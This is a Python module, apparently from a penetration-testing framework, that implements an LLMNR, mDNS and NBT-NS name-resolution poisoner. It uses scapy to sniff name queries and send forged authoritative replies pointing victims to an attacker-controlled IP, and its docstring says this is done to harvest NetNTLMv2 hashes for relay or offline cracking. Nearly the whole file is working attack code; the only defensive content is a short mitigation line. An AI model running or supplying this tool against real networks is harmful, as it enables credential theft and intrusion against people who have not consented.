"""
LLMNR / mDNS Poisoner — T1557.001

Responder-lite: sniffs LLMNR (UDP/5355), mDNS (UDP/5353) and
NBT-NS (UDP/137) name queries and answers with the attacker IP.
Victims attempting \\SHARE / intranet names leak NetNTLMv2 —
relay or crack offline.

Scope modes: answer all (--spoof-ip) or only --target-name.
Poisoning only, no hash capture server included — pair with
tcpdump/Responder/ntlmrelayx for full chain.

Mitigation: disable LLMNR/NBT-NS via GPO, mDNS off on servers,
SMB signing required, NetBIOS over TCP/IP disabled.
"""
from scapy.all import (DNS, DNSQR, DNSRR, IP, UDP, Ether,
                       sendp, sniff, get_if_addr)

NAME = "llmnr"
DESCRIPTION = "LLMNR/mDNS/NBT-NS poisoner — NetNTLMv2 capture setup"
ATTCK_ID = "T1557.001"


def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(NAME, help=f"{DESCRIPTION} ({ATTCK_ID})",
                              description=__doc__)
    p.add_argument("-i", "--interface", required=True)
    p.add_argument("--spoof-ip", default=None, help="IP to answer with (default: iface IP)")
    p.add_argument("--target-name", default=None, help="Only poison this name (else all)")
    p.add_argument("--duration", type=int, default=300, help="Seconds to run")
    p.add_argument("--verbose", "-v", action="store_true")
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    from core.common import require_root
    require_root()
    try:
        spoof = args.spoof_ip or get_if_addr(args.interface)
    except Exception:
        logger.error("Cannot resolve spoof IP — pass --spoof-ip explicitly")
        return 1
    logger.info("START | technique=%s | iface=%s | spoof=%s | target=%s",
                ATTCK_ID, args.interface, spoof, args.target_name or "ALL")
    state = {"n": 0}

    def _should_poison(qname):
        if not qname:
            return False
        name = qname.decode().rstrip(".") if isinstance(qname, bytes) else str(qname).rstrip(".")
        if args.target_name and args.target_name.lower() not in name.lower():
            return False
        if name.endswith(("local", "lan")) or True:
            return True
        return True

    def handler(pkt):
        try:
            if not pkt.haslayer(DNS) or not pkt.haslayer(UDP):
                return
            dns = pkt[DNS]
            if dns.qr != 0 or dns.qd is None:
                return
            qname = dns.qd.qname
            if not _should_poison(qname):
                return
            dport = pkt[UDP].sport
            resp = (Ether(dst=pkt[Ether].src) /
                    IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                    UDP(sport=pkt[UDP].dport, dport=dport) /
                    DNS(id=dns.id, qr=1, aa=1, qd=dns.qd,
                        an=DNSRR(rrname=qname, ttl=30, rdata=spoof)))
            sendp(resp, iface=args.interface, verbose=False)
            state["n"] += 1
            logger.info("[LLMNR] poisoned %s -> %s (%d)", qname, spoof, state["n"])
        except Exception:
            pass

    try:
        sniff(iface=args.interface, filter="udp port 5355 or udp port 5353 or udp port 137",
              prn=handler, store=False, timeout=args.duration)
        logger.info("END | success=True poisoned=%d", state["n"])
        return 0
    except Exception as e:
        logger.error("[LLMNR] Error: %s", e)
        return 1
